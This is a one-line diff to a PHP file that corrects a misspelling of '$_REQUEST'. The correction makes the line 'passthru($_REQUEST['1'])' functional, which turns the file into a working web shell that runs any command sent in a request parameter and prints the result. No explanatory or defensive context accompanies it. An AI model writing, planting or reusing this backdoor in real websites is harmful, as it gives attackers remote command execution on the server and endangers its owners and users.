@@ -1,1 +1,1 @@
-<?php passthru($_REQQUEST['1']);?>
+<?php passthru($_REQUEST['1']);?>
